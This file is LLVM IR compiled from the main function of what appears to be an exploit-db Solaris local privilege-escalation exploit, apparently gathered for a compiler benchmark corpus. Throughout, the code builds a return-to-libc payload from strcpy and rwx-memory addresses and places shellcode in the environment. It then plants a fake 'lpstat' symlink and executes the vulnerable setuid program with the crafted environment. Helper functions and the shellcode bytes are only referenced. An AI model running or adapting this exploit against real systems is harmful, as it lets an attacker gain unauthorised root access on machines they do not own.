; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_46877.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/solaris/local/extr_46877.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@BUFSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [4 x i8] c"foo\00", align 1
@__const.main.arg = private unnamed_addr constant [2 x i8*] [i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i32 0, i32 0), i8* null], align 16
@.str.1 = private unnamed_addr constant [7 x i8] c"strcpy\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"lpstat\00", align 1
@.str.3 = private unnamed_addr constant [4 x i8] c"KSH\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"-v\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [23 x i8] c"lpstat called with -v\0A\00", align 1
@.str.6 = private unnamed_addr constant [26 x i8] c"device for %s: /dev/null\0A\00", align 1
@.str.7 = private unnamed_addr constant [23 x i8] c"lpstat called with -d\0A\00", align 1
@.str.8 = private unnamed_addr constant [32 x i8] c"system default destination: %s\0A\00", align 1
@.str.9 = private unnamed_addr constant [8 x i8] c"%s\0A%s\0A\0A\00", align 1
@INFO1 = common dso_local global i8* null, align 8
@INFO2 = common dso_local global i8* null, align 8
@.str.10 = private unnamed_addr constant [28 x i8] c"usage: %s xserver:display\0A\0A\00", align 1
@.str.11 = private unnamed_addr constant [11 x i8] c"DISPLAY=%s\00", align 1
@SI_PLATFORM = common dso_local global i32 0, align 4
@SI_RELEASE = common dso_local global i32 0, align 4
@sc = common dso_local global i8* null, align 8
@env_pos = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [15 x i8] c"KSH=0x42424242\00", align 1
@.str.13 = private unnamed_addr constant [16 x i8] c"PATH=.:/usr/bin\00", align 1
@.str.14 = private unnamed_addr constant [10 x i8] c"HOME=/tmp\00", align 1
@VULN = common dso_local global i8* null, align 8
@env_len = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [9 x i8] c"KSH=0x%x\00", align 1
@env = common dso_local global i8** null, align 8
@.str.16 = private unnamed_addr constant [29 x i8] c"Using SI_PLATFORM\09: %s (%s)\0A\00", align 1
@.str.17 = private unnamed_addr constant [25 x i8] c"Using stack base\09: 0x%p\0A\00", align 1
@.str.18 = private unnamed_addr constant [30 x i8] c"Using rwx_mem address\09: 0x%p\0A\00", align 1
@.str.19 = private unnamed_addr constant [25 x i8] c"Using sc address\09: 0x%p\0A\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"Using strcpy() address\09: 0x%p\0A\0A\00", align 1
@.str.21 = private unnamed_addr constant [7 x i8] c"execve\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca [16 x i8], align 16
  %9 = alloca [256 x i8], align 16
  %10 = alloca [256 x i8], align 16
  %11 = alloca [256 x i8], align 16
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca [2 x i8*], align 16
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %22 = load i32, i32* @BUFSIZE, align 4
  %23 = zext i32 %22 to i64
  %24 = call i8* @llvm.stacksave()
  store i8* %24, i8** %6, align 8
  %25 = alloca i8, i64 %23, align 16
  store i64 %23, i64* %7, align 8
  %26 = bitcast [2 x i8*]* %18 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %26, i8* align 16 bitcast ([2 x i8*]* @__const.main.arg to i8*), i64 16, i1 false)
  %27 = load i8**, i8*** %5, align 8
  %28 = getelementptr inbounds i8*, i8** %27, i64 0
  %29 = load i8*, i8** %28, align 8
  %30 = ptrtoint i8* %29 to i32
  %31 = or i32 %30, 4095
  store i32 %31, i32* %19, align 4
  %32 = call i32 @search_ldso(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.1, i64 0, i64 0))
  store i32 %32, i32* %20, align 4
  %33 = call i32 (...) @search_rwx_mem()
  store i32 %33, i32* %21, align 4
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 0
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @strcmp(i8* %36, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %38 = icmp ne i32 %37, 0
  br i1 %38, label %91, label %39

39:                                               ; preds = %2
  %40 = load i32, i32* %4, align 4
  %41 = icmp ne i32 %40, 2
  br i1 %41, label %42, label %44

42:                                               ; preds = %39
  %43 = call i32 @exit(i32 1) #5
  unreachable

44:                                               ; preds = %39
  %45 = call i32 @getenv(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.3, i64 0, i64 0))
  %46 = call i64 @strtoul(i32 %45, i8** null, i32 0)
  %47 = trunc i64 %46 to i32
  store i32 %47, i32* %14, align 4
  %48 = trunc i64 %23 to i32
  %49 = call i32 @memset(i8* %25, i8 signext 65, i32 %48)
  %50 = sub i64 %23, 1
  %51 = getelementptr inbounds i8, i8* %25, i64 %50
  store i8 0, i8* %51, align 1
  store i32 0, i32* %12, align 4
  br label %52

52:                                               ; preds = %72, %44
  %53 = load i32, i32* %12, align 4
  %54 = load i32, i32* @BUFSIZE, align 4
  %55 = icmp slt i32 %53, %54
  br i1 %55, label %56, label %75

56:                                               ; preds = %52
  %57 = load i32, i32* %12, align 4
  %58 = load i32, i32* %20, align 4
  %59 = call i32 @set_val(i8* %25, i32 %57, i32 %58)
  %60 = load i32, i32* %12, align 4
  %61 = add nsw i32 %60, 4
  store i32 %61, i32* %12, align 4
  %62 = load i32, i32* %21, align 4
  %63 = call i32 @set_val(i8* %25, i32 %61, i32 %62)
  %64 = load i32, i32* %12, align 4
  %65 = add nsw i32 %64, 4
  store i32 %65, i32* %12, align 4
  %66 = load i32, i32* %21, align 4
  %67 = call i32 @set_val(i8* %25, i32 %65, i32 %66)
  %68 = load i32, i32* %12, align 4
  %69 = add nsw i32 %68, 4
  store i32 %69, i32* %12, align 4
  %70 = load i32, i32* %14, align 4
  %71 = call i32 @set_val(i8* %25, i32 %69, i32 %70)
  br label %72

72:                                               ; preds = %56
  %73 = load i32, i32* %12, align 4
  %74 = add nsw i32 %73, 4
  store i32 %74, i32* %12, align 4
  br label %52

75:                                               ; preds = %52
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 1
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @strcmp(i8* %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0))
  %80 = icmp ne i32 %79, 0
  br i1 %80, label %85, label %81

81:                                               ; preds = %75
  %82 = load i32, i32* @stderr, align 4
  %83 = call i32 (i32, i8*, ...) @fprintf(i32 %82, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.5, i64 0, i64 0))
  %84 = call i32 @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.6, i64 0, i64 0), i8* %25)
  br label %89

85:                                               ; preds = %75
  %86 = load i32, i32* @stderr, align 4
  %87 = call i32 (i32, i8*, ...) @fprintf(i32 %86, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.7, i64 0, i64 0))
  %88 = call i32 @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.8, i64 0, i64 0), i8* %25)
  br label %89

89:                                               ; preds = %85, %81
  %90 = call i32 @exit(i32 0) #5
  unreachable

91:                                               ; preds = %2
  %92 = load i32, i32* @stderr, align 4
  %93 = load i8*, i8** @INFO1, align 8
  %94 = load i8*, i8** @INFO2, align 8
  %95 = call i32 (i32, i8*, ...) @fprintf(i32 %92, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.9, i64 0, i64 0), i8* %93, i8* %94)
  %96 = load i32, i32* %4, align 4
  %97 = icmp ne i32 %96, 2
  br i1 %97, label %98, label %105

98:                                               ; preds = %91
  %99 = load i32, i32* @stderr, align 4
  %100 = load i8**, i8*** %5, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 0
  %102 = load i8*, i8** %101, align 8
  %103 = call i32 (i32, i8*, ...) @fprintf(i32 %99, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0), i8* %102)
  %104 = call i32 @exit(i32 1) #5
  unreachable

105:                                              ; preds = %91
  %106 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %107 = load i8**, i8*** %5, align 8
  %108 = getelementptr inbounds i8*, i8** %107, i64 1
  %109 = load i8*, i8** %108, align 8
  %110 = call i32 (i8*, i8*, ...) @sprintf(i8* %106, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.11, i64 0, i64 0), i8* %109)
  %111 = load i32, i32* @SI_PLATFORM, align 4
  %112 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %113 = call i32 @sysinfo(i32 %111, i8* %112, i32 255)
  %114 = load i32, i32* @SI_RELEASE, align 4
  %115 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %116 = call i32 @sysinfo(i32 %114, i8* %115, i32 255)
  %117 = load i8*, i8** @sc, align 8
  %118 = call i32 @add_env(i8* %117)
  %119 = load i32, i32* @env_pos, align 4
  store i32 %119, i32* %15, align 4
  %120 = call i32 @add_env(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0))
  %121 = getelementptr inbounds [256 x i8], [256 x i8]* %11, i64 0, i64 0
  %122 = call i32 @add_env(i8* %121)
  %123 = call i32 @add_env(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.13, i64 0, i64 0))
  %124 = call i32 @add_env(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.14, i64 0, i64 0))
  %125 = call i32 @add_env(i8* null)
  %126 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %127 = call i32 @strlen(i8* %126)
  %128 = add nsw i32 %127, 1
  store i32 %128, i32* %16, align 4
  %129 = load i8*, i8** @VULN, align 8
  %130 = call i32 @strlen(i8* %129)
  %131 = add nsw i32 %130, 1
  store i32 %131, i32* %17, align 4
  %132 = load i32, i32* @env_len, align 4
  %133 = add nsw i32 5, %132
  %134 = load i32, i32* %16, align 4
  %135 = add nsw i32 %133, %134
  %136 = load i32, i32* %17, align 4
  %137 = add nsw i32 %135, %136
  store i32 %137, i32* %13, align 4
  %138 = load i32, i32* %19, align 4
  %139 = load i32, i32* %13, align 4
  %140 = sub nsw i32 %138, %139
  store i32 %140, i32* %14, align 4
  %141 = getelementptr inbounds [16 x i8], [16 x i8]* %8, i64 0, i64 0
  %142 = load i32, i32* %14, align 4
  %143 = call i32 (i8*, i8*, ...) @sprintf(i8* %141, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.15, i64 0, i64 0), i32 %142)
  %144 = getelementptr inbounds [16 x i8], [16 x i8]* %8, i64 0, i64 0
  %145 = load i8**, i8*** @env, align 8
  %146 = load i32, i32* %15, align 4
  %147 = sext i32 %146 to i64
  %148 = getelementptr inbounds i8*, i8** %145, i64 %147
  store i8* %144, i8** %148, align 8
  %149 = call i32 @unlink(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %150 = load i8**, i8*** %5, align 8
  %151 = getelementptr inbounds i8*, i8** %150, i64 0
  %152 = load i8*, i8** %151, align 8
  %153 = call i32 @symlink(i8* %152, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  %154 = load i32, i32* @stderr, align 4
  %155 = getelementptr inbounds [256 x i8], [256 x i8]* %9, i64 0, i64 0
  %156 = getelementptr inbounds [256 x i8], [256 x i8]* %10, i64 0, i64 0
  %157 = call i32 (i32, i8*, ...) @fprintf(i32 %154, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.16, i64 0, i64 0), i8* %155, i8* %156)
  %158 = load i32, i32* @stderr, align 4
  %159 = load i32, i32* %19, align 4
  %160 = sext i32 %159 to i64
  %161 = inttoptr i64 %160 to i8*
  %162 = call i32 (i32, i8*, ...) @fprintf(i32 %158, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.17, i64 0, i64 0), i8* %161)
  %163 = load i32, i32* @stderr, align 4
  %164 = load i32, i32* %21, align 4
  %165 = sext i32 %164 to i64
  %166 = inttoptr i64 %165 to i8*
  %167 = call i32 (i32, i8*, ...) @fprintf(i32 %163, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.18, i64 0, i64 0), i8* %166)
  %168 = load i32, i32* @stderr, align 4
  %169 = load i32, i32* %14, align 4
  %170 = sext i32 %169 to i64
  %171 = inttoptr i64 %170 to i8*
  %172 = call i32 (i32, i8*, ...) @fprintf(i32 %168, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.19, i64 0, i64 0), i8* %171)
  %173 = load i32, i32* @stderr, align 4
  %174 = load i32, i32* %20, align 4
  %175 = sext i32 %174 to i64
  %176 = inttoptr i64 %175 to i8*
  %177 = call i32 (i32, i8*, ...) @fprintf(i32 %173, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.20, i64 0, i64 0), i8* %176)
  %178 = load i8*, i8** @VULN, align 8
  %179 = getelementptr inbounds [2 x i8*], [2 x i8*]* %18, i64 0, i64 0
  %180 = load i8**, i8*** @env, align 8
  %181 = call i32 @execve(i8* %178, i8** %179, i8** %180)
  %182 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.21, i64 0, i64 0))
  %183 = call i32 @exit(i32 0) #5
  unreachable
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #2

declare dso_local i32 @search_ldso(i8*) #3

declare dso_local i32 @search_rwx_mem(...) #3

declare dso_local i32 @strcmp(i8*, i8*) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i64 @strtoul(i32, i8**, i32) #3

declare dso_local i32 @getenv(i8*) #3

declare dso_local i32 @memset(i8*, i8 signext, i32) #3

declare dso_local i32 @set_val(i8*, i32, i32) #3

declare dso_local i32 @fprintf(i32, i8*, ...) #3

declare dso_local i32 @printf(i8*, i8*) #3

declare dso_local i32 @sprintf(i8*, i8*, ...) #3

declare dso_local i32 @sysinfo(i32, i8*, i32) #3

declare dso_local i32 @add_env(i8*) #3

declare dso_local i32 @strlen(i8*) #3

declare dso_local i32 @unlink(i8*) #3

declare dso_local i32 @symlink(i8*, i8*) #3

declare dso_local i32 @execve(i8*, i8**, i8**) #3

declare dso_local i32 @perror(i8*) #3

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { argmemonly nounwind willreturn }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
